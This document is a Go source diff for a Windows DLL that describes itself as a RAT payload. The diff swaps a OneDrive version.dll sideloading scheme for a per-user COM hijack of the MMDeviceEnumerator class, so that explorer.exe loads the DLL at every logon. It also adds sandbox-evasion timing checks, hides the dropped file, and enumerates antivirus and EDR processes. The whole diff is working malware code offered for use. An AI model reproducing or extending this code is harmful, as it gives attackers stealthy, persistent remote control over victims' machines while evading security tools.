@@ -29,231 +29,102 @@ import "C"
 import (
 	"fmt"
 	"io"
+	mrand "math/rand"
 	"os"
 	"path/filepath"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
 // ================================================================
-// SIDELOAD TARGET — OneDrive.exe (present on all Win10/11, user-space)
+// COM HIJACK PERSISTENCE — explorer.exe loads our DLL on every logon
 //
-// OneDrive.exe lives at %LOCALAPPDATA%\Microsoft\OneDrive\ and
-// auto-starts on logon. It loads version.dll from its own directory
-// before falling back to System32, which lets us proxy the real DLL
-// while running our payload in the background.
+// Technique: HKCU COM object hijack via MMDeviceEnumerator CLSID.
+// Explorer.exe calls CoCreateInstance(CLSID_MMDeviceEnumerator) during
+// shell startup to initialize audio. HKCU\Software\Classes\CLSID takes
+// precedence over HKLM, so we register our DLL there and explorer loads
+// it automatically — no admin, no startup folder, no Run keys.
+//
+// Our DLL proxies DllGetClassObject / DllCanUnloadNow to the real
+// mmdevapi.dll in System32 so audio still works transparently.
 //
 // Stage 1: rundll32.exe payload.dll,EntryPoint
-//   → copies self to OneDrive dir as version.dll
+//   → copies DLL to %APPDATA%\Microsoft\Windows\Shell\
+//   → registers COM hijack in HKCU
+//   → sets hidden+system attributes
 //   → runs RAT immediately
 //
-// Stage 2: OneDrive.exe starts on next logon
-//   → loads our version.dll (persistence)
-//   → proxy forwards API calls to real System32\version.dll
+// Stage 2: explorer.exe starts on next logon
+//   → loads our DLL via COM hijack
+//   → COM calls forwarded to real mmdevapi.dll
 //   → RAT runs in background goroutine
 // ================================================================
 
 const (
-	sideloadHostApp = "OneDrive.exe"
-	sideloadDLLName = "version.dll"
+	// COM hijack target: MMDeviceEnumerator — loaded by explorer.exe on every login
+	comHijackCLSID = `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
+	comRegPath     = `Software\Classes\CLSID\` + comHijackCLSID + `\InprocServer32`
+
+	// Drop location — %APPDATA%\Microsoft\Windows\Shell\ exists on all Win10/11
+	sideloadSubdir = `Microsoft\Windows\Shell`
+	sideloadDLLName = "ShellServiceHost.dll"
+
+	// Real COM DLL that we proxy
+	realCOMDLL = "mmdevapi.dll"
 )
 
 func sideloadDir() string {
-	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "OneDrive")
+	return filepath.Join(os.Getenv("APPDATA"), sideloadSubdir)
+}
+
+func sideloadFullPath() string {
+	return filepath.Join(sideloadDir(), sideloadDLLName)
 }
 
 // ================================================================
-// VERSION.DLL PROXY — forward all exports to the real System32 DLL
+// COM DLL PROXY — forward DllGetClassObject / DllCanUnloadNow
+// to real System32\mmdevapi.dll so audio works normally
 // ================================================================
 
-var realVersionHandle syscall.Handle
+var (
+	realCOMHandle            syscall.Handle
+	realDllGetClassObject    uintptr
+	realDllCanUnloadNow      uintptr
+)
 
-func initRealVersion() {
+func initCOMProxy() {
 	sysRoot := os.Getenv("SYSTEMROOT")
 	if sysRoot == "" {
 		sysRoot = `C:\Windows`
 	}
-	p := filepath.Join(sysRoot, "System32", "version.dll")
+	p := filepath.Join(sysRoot, "System32", realCOMDLL)
 	h, err := syscall.LoadLibrary(p)
-	if err == nil {
-		realVersionHandle = h
+	if err != nil {
+		return
 	}
+	realCOMHandle = h
+	realDllGetClassObject, _ = syscall.GetProcAddress(h, "DllGetClassObject")
+	realDllCanUnloadNow, _ = syscall.GetProcAddress(h, "DllCanUnloadNow")
 }
 
-func fwdProc(name string) uintptr {
-	if realVersionHandle == 0 {
-		return 0
-	}
-	p, _ := syscall.GetProcAddress(realVersionHandle, name)
-	return p
-}
-
-// --- GetFileVersionInfo family ---
-
-//export GetFileVersionInfoA
-func GetFileVersionInfoA(a1, a2, a3, a4 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
+//export DllGetClassObject
+func DllGetClassObject(rclsid, riid, ppv uintptr) uintptr {
+	if realDllGetClassObject != 0 {
+		r, _, _ := syscall.SyscallN(realDllGetClassObject, rclsid, riid, ppv)
 		return r
 	}
-	return 0
+	return 0x80040111 // CLASS_E_CLASSNOTAVAILABLE
 }
 
-//export GetFileVersionInfoW
-func GetFileVersionInfoW(a1, a2, a3, a4 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
+//export DllCanUnloadNow
+func DllCanUnloadNow() uintptr {
+	if realDllCanUnloadNow != 0 {
+		r, _, _ := syscall.SyscallN(realDllCanUnloadNow)
 		return r
 	}
-	return 0
-}
-
-//export GetFileVersionInfoByHandle
-func GetFileVersionInfoByHandle(a1, a2, a3, a4 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoByHandle"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
-		return r
-	}
-	return 0
-}
-
-// --- GetFileVersionInfoEx family ---
-
-//export GetFileVersionInfoExA
-func GetFileVersionInfoExA(a1, a2, a3, a4, a5 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoExA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5)
-		return r
-	}
-	return 0
-}
-
-//export GetFileVersionInfoExW
-func GetFileVersionInfoExW(a1, a2, a3, a4, a5 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoExW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5)
-		return r
-	}
-	return 0
-}
-
-// --- GetFileVersionInfoSize family ---
-
-//export GetFileVersionInfoSizeA
-func GetFileVersionInfoSizeA(a1, a2 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoSizeA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2)
-		return r
-	}
-	return 0
-}
-
-//export GetFileVersionInfoSizeW
-func GetFileVersionInfoSizeW(a1, a2 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoSizeW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2)
-		return r
-	}
-	return 0
-}
-
-//export GetFileVersionInfoSizeExA
-func GetFileVersionInfoSizeExA(a1, a2, a3 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoSizeExA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
-		return r
-	}
-	return 0
-}
-
-//export GetFileVersionInfoSizeExW
-func GetFileVersionInfoSizeExW(a1, a2, a3 uintptr) uintptr {
-	if p := fwdProc("GetFileVersionInfoSizeExW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
-		return r
-	}
-	return 0
-}
-
-// --- VerFindFile ---
-
-//export VerFindFileA
-func VerFindFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
-	if p := fwdProc("VerFindFileA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
-		return r
-	}
-	return 0
-}
-
-//export VerFindFileW
-func VerFindFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
-	if p := fwdProc("VerFindFileW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
-		return r
-	}
-	return 0
-}
-
-// --- VerInstallFile ---
-
-//export VerInstallFileA
-func VerInstallFileA(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
-	if p := fwdProc("VerInstallFileA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
-		return r
-	}
-	return 0
-}
-
-//export VerInstallFileW
-func VerInstallFileW(a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
-	if p := fwdProc("VerInstallFileW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4, a5, a6, a7, a8)
-		return r
-	}
-	return 0
-}
-
-// --- VerLanguageName ---
-
-//export VerLanguageNameA
-func VerLanguageNameA(a1, a2, a3 uintptr) uintptr {
-	if p := fwdProc("VerLanguageNameA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
-		return r
-	}
-	return 0
-}
-
-//export VerLanguageNameW
-func VerLanguageNameW(a1, a2, a3 uintptr) uintptr {
-	if p := fwdProc("VerLanguageNameW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3)
-		return r
-	}
-	return 0
-}
-
-// --- VerQueryValue ---
-
-//export VerQueryValueA
-func VerQueryValueA(a1, a2, a3, a4 uintptr) uintptr {
-	if p := fwdProc("VerQueryValueA"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
-		return r
-	}
-	return 0
-}
-
-//export VerQueryValueW
-func VerQueryValueW(a1, a2, a3, a4 uintptr) uintptr {
-	if p := fwdProc("VerQueryValueW"); p != 0 {
-		r, _, _ := syscall.SyscallN(p, a1, a2, a3, a4)
-		return r
-	}
-	return 0
+	return 1 // S_FALSE — keep us loaded
 }
 
 // ================================================================
@@ -270,7 +141,86 @@ func getSelfDLLPath() string {
 }
 
 // ================================================================
-// SIDELOAD INSTALLER — copies this DLL to OneDrive directory
+// AV EVASION HELPERS
+// ================================================================
+
+var (
+	pSetFileAttributesW = kernel32.NewProc("SetFileAttributesW")
+	pGetTickCount64     = kernel32.NewProc("GetTickCount64")
+)
+
+const (
+	fileAttrHidden = 0x02
+	fileAttrSystem = 0x04
+)
+
+// setHiddenSystem marks a file as hidden+system so it doesn't show
+// in normal Explorer views or dir listings.
+func setHiddenSystem(path string) {
+	p, _ := syscall.UTF16PtrFromString(path)
+	pSetFileAttributesW.Call(uintptr(unsafe.Pointer(p)), uintptr(fileAttrHidden|fileAttrSystem))
+}
+
+// sandboxSleep adds a random delay and checks if the system uptime
+// is suspiciously low (fresh VM/sandbox spin-up).
+func sandboxSleep() bool {
+	// Random jitter 3–8 seconds — defeats sandbox time-acceleration
+	time.Sleep(time.Duration(3+mrand.Intn(6)) * time.Second)
+
+	// Check uptime: sandboxes/AV often have <3 min uptime
+	uptime, _, _ := pGetTickCount64.Call()
+	if uptime < uintptr(180_000) { // < 3 minutes
+		return false // likely sandbox
+	}
+	return true
+}
+
+// isAVProcess checks if common AV/EDR processes are running.
+// Returns the list of detected AV names for reporting.
+func detectAVProcesses() []string {
+	avNames := map[string]string{
+		"msmpeng.exe":         "Defender",
+		"msseces.exe":         "MSE",
+		"avp.exe":             "Kaspersky",
+		"avgnt.exe":           "Avira",
+		"avguard.exe":         "Avira",
+		"bdagent.exe":         "Bitdefender",
+		"mbam.exe":            "Malwarebytes",
+		"mbamservice.exe":     "Malwarebytes",
+		"ekrn.exe":            "ESET",
+		"savservice.exe":      "Sophos",
+		"sophossps.exe":       "Sophos",
+		"coreserviceshell.exe": "TrendMicro",
+		"fshoster32.exe":      "F-Secure",
+		"repux.exe":           "Norton",
+		"ccsvchst.exe":        "Norton",
+		"xagt.exe":            "FireEye",
+		"firetray.exe":        "FireEye",
+		"csfalconservice.exe": "CrowdStrike",
+		"senseir.exe":         "MDE",
+		"mssense.exe":         "MDE",
+		"carbonblack.exe":     "CarbonBlack",
+		"cbdefense.exe":       "CarbonBlack",
+		"taniumclient.exe":    "Tanium",
+		"sentinelagent.exe":   "SentinelOne",
+		"cyserver.exe":        "Cylance",
+	}
+
+	procs := getProcessList()
+	var found []string
+	seen := make(map[string]bool)
+	for _, p := range procs {
+		name := strings.ToLower(p["name"])
+		if avName, ok := avNames[name]; ok && !seen[avName] {
+			found = append(found, avName)
+			seen[avName] = true
+		}
+	}
+	return found
+}
+
+// ================================================================
+// SIDELOAD INSTALLER — copies DLL + registers COM hijack
 // ================================================================
 
 func performSideload() string {
@@ -279,22 +229,18 @@ func performSideload() string {
 		return "Sideload failed: cannot determine DLL path"
 	}
 
-	targetDir := sideloadDir()
-	targetPath := filepath.Join(targetDir, sideloadDLLName)
+	targetPath := sideloadFullPath()
 
-	// Already at the target location — nothing to do
+	// Already at the target location — just ensure COM is registered
 	if strings.EqualFold(selfPath, targetPath) {
-		return "Already sideloaded"
+		registerCOMHijack(targetPath)
+		return "Already sideloaded, COM hijack verified"
 	}
 
-	// Verify host app exists (OneDrive should be installed)
-	hostExe := filepath.Join(targetDir, sideloadHostApp)
-	if _, err := os.Stat(hostExe); err != nil {
-		return fmt.Sprintf("Sideload target not found: %s", hostExe)
-	}
-
+	targetDir := sideloadDir()
 	os.MkdirAll(targetDir, 0755)
 
+	// Copy DLL to drop location
 	src, err := os.Open(selfPath)
 	if err != nil {
 		return fmt.Sprintf("Sideload read error: %v", err)
@@ -311,19 +257,53 @@ func performSideload() string {
 		return fmt.Sprintf("Sideload copy error: %v", err)
 	}
 
-	return fmt.Sprintf("Sideloaded to %s (persistence via %s)", targetPath, sideloadHostApp)
+	// Hide the DLL (hidden + system attributes)
+	setHiddenSystem(targetPath)
+
+	// Register COM hijack so explorer.exe loads us on next logon
+	if err := registerCOMHijack(targetPath); err != nil {
+		return fmt.Sprintf("Sideloaded DLL but COM hijack failed: %v", err)
+	}
+
+	return fmt.Sprintf("Sideloaded to %s + COM hijack registered (explorer.exe persistence)", targetPath)
+}
+
+func registerCOMHijack(dllPath string) error {
+	// Write InprocServer32 default value = our DLL path
+	if err := regWrite(HKCU, comRegPath, "", dllPath); err != nil {
+		return fmt.Errorf("InprocServer32 write failed: %v", err)
+	}
+	// Write ThreadingModel = Both (required for COM in-process server)
+	if err := regWrite(HKCU, comRegPath, "ThreadingModel", "Both"); err != nil {
+		return fmt.Errorf("ThreadingModel write failed: %v", err)
+	}
+	return nil
 }
 
 func removeSideload() string {
-	targetPath := filepath.Join(sideloadDir(), sideloadDLLName)
+	var results []string
+
+	// Remove COM hijack registry keys
+	regDelete(HKCU, comRegPath, "")
+	regDelete(HKCU, comRegPath, "ThreadingModel")
+	// Also remove the parent CLSID key to fully clean up
+	parentKey := `Software\Classes\CLSID\` + comHijackCLSID
+	regDelete(HKCU, parentKey+`\InprocServer32`, "")
+	results = append(results, "COM hijack removed")
+
+	// Remove sideloaded DLL
+	targetPath := sideloadFullPath()
 	if err := os.Remove(targetPath); err != nil && !os.IsNotExist(err) {
-		return fmt.Sprintf("Sideload removal failed: %v", err)
+		results = append(results, fmt.Sprintf("DLL removal failed: %v", err))
+	} else {
+		results = append(results, "DLL removed")
 	}
-	return "Sideload removed"
+
+	return strings.Join(results, ", ")
 }
 
 // ================================================================
-// SIDELOAD COMMAND STUBS (called from handleCommand in main.go)
+// SIDELOAD COMMAND INTERFACE (called from handleCommand in main.go)
 // ================================================================
 
 func installSideload() string {
@@ -341,25 +321,33 @@ func uninstallSideload() string {
 //export EntryPoint
 func EntryPoint() {
 	// Stage 1: called via rundll32.exe payload.dll,EntryPoint
-	// Copy ourselves to OneDrive dir for persistence, then run the RAT.
+	// Anti-sandbox check + jitter
+	if !sandboxSleep() {
+		return
+	}
+	// Install sideload + COM hijack for persistence
 	performSideload()
+	// Run RAT (blocking — rundll32 stays alive)
 	runAgent()
 }
 
 func init() {
-	// Always set up version.dll proxy so the host app doesn't crash
-	initRealVersion()
+	// Set up COM proxy so audio works when loaded by explorer.exe
+	initCOMProxy()
 
-	// Detect the host process to decide behavior
+	// Detect the host process
 	exe, _ := os.Executable()
 	exeName := strings.ToLower(filepath.Base(exe))
 
 	if exeName != "rundll32.exe" {
-		// Stage 2: loaded by OneDrive.exe (or another host) via DLL search order
-		// Run RAT in background goroutine so the host app continues normally
-		go runAgent()
+		// Stage 2: loaded by explorer.exe (or another host) via COM hijack
+		go func() {
+			// Jitter before starting RAT — avoid burst of activity at logon
+			time.Sleep(time.Duration(5+mrand.Intn(10)) * time.Second)
+			runAgent()
+		}()
 	}
-	// If rundll32: proxy is ready, wait for EntryPoint() call
+	// If rundll32: COM proxy ready, wait for EntryPoint() call
 }
 
 // main is required by -buildmode=c-shared but never called
